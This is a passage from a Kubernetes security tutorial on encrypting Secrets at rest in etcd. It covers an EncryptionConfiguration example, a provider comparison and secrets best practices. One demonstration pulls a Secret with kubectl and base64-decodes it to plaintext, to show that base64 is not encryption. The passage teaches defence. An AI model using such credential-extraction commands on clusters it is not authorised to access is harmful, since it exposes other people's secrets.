          💀 COMPLETE BREACH
  
  ✅ WITH encryption at rest:
          → etcd stores ENCRYPTED ciphertext
          → Step 4 returns: "a7f3b9c1d5e8..." (unreadable without key)
          → Encryption key is stored SEPARATELY from etcd data
          → Even with the backup file, Secrets are safe 🛡️

  $ kubectl create secret generic db-creds \
      --from-literal=password=supersecret123
  
  $ kubectl get secret db-creds -o jsonpath='{.data.password}'
  c3VwZXJzZWNyZXQxMjM=          ← Looks "encrypted" but it's NOT!
  
  $ echo "c3VwZXJzZWNyZXQxMjM=" | base64 -d
  supersecret123                ← Anyone can decode this! 🔴
  
  WITHOUT etcd encryption:
  → Direct etcd read → plaintext Secrets exposed
  → RBAC access to Secrets → plaintext values visible
  
  WITH etcd encryption at rest:
  → Direct etcd read → ENCRYPTED blob (unreadable without key)
  → RBAC access to Secrets → K8s decrypts for authorized users only

19.2 Enabling Encryption at Rest

Encryption at rest is configured via an EncryptionConfiguration resource and passed to the API server. After enabling, NEW Secrets are encrypted — existing Secrets must be rotated (re-written) to be encrypted.

EncryptionConfiguration YAML

/etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources: ["secrets"]
  providers:
  - aescbc:                       # Primary: AES-CBC encryption
      keys:
      - name: key1
        secret: <base64-encoded-32-byte-key>
  - identity: {}                  # Fallback: allow plaintext (for migration)

API Server Flag

# In /etc/kubernetes/manifests/kube-apiserver.yaml:
spec:
  containers:
  - command:
    - kube-apiserver
    - --encryption-provider-config=/etc/kubernetes/encryption-config.yaml

Rotate Existing Secrets

# After enabling encryption, re-write all Secrets to encrypt them:
kubectl get secrets --all-namespaces -o json | kubectl replace -f -
# → Every Secret is now encrypted in etcd ✅

19.3 Encryption Providers — Which to Use

identity — No Encryption (The Dangerous Default)

The identity provider does NOTHING — Secrets are stored in plaintext. This is the default when no encryption config is provided. Only use as a temporary fallback during migration.

aescbc — AES-CBC (Recommended)

AES in Cipher Block Chaining mode with a 32-byte key. Widely supported, battle-tested, and the most commonly recommended provider. Generates a random 16-byte IV per encryption.

aesgcm — AES-GCM (Faster)

AES in Galois/Counter Mode. Provides authenticated encryption (detects tampering) and is generally faster than CBC. Uses 16, 24, or 32-byte keys with a 12-byte nonce.

secretbox — XSalsa20 + Poly1305 (Alternative)

Based on Daniel Bernstein's NaCl library. Uses XSalsa20 stream cipher with Poly1305 authentication. 32-byte key. Good alternative if you prefer non-AES cryptography.

kms — External Key Management (Enterprise)

Integrates with cloud KMS (AWS KMS, GCP Cloud KMS, Azure Key Vault). Encryption keys never leave the KMS — the API server calls KMS for every encrypt/decrypt operation. Best for enterprises with compliance requirements.

ProviderAlgorithmKey SizeRecommendation
identityNone — plaintextN/A❌ Only as fallback during migration
aescbcAES-CBC32 bytes✅ Recommended
aesgcmAES-GCM16/24/32 bytes✅ Faster, authenticated
secretboxXSalsa20 + Poly130532 bytes✅ Alternative
kmsExternal KMSManaged✅ Enterprise

19.4 Secrets Management in anihpj — Best Practices

✅ anihpj Secrets Best Practices
  • ✅ Django SECRET_KEY → K8s Secret (NOT hardcoded in settings.py)
  • ✅ Database password → K8s Secret, mounted as env var: env[].valueFrom.secretKeyRef
  • ✅ AWS credentials → IAM Roles / IRSA (NOT stored as Secrets at all)

Kubernetes Secrets are a good start, but enterprise environments need more: dynamic secrets that auto-expire, full audit trails of who accessed what, and centralized rotation. HashiCorp Vault and External Secrets Operator (ESO) provide this.

🎯 What You'll Learn

20.1 Why Kubernetes Secrets Alone Are Not Enough

FeatureK8s SecretsHashiCorp VaultAWS Secrets Mgr
Encryption at rest✅ With config✅ Built-in✅ Built-in
Dynamic secrets (auto-expire)❌ No✅ Yes✅ Rotation
Access audit trail❌ No native✅ Full audit log✅ CloudTrail
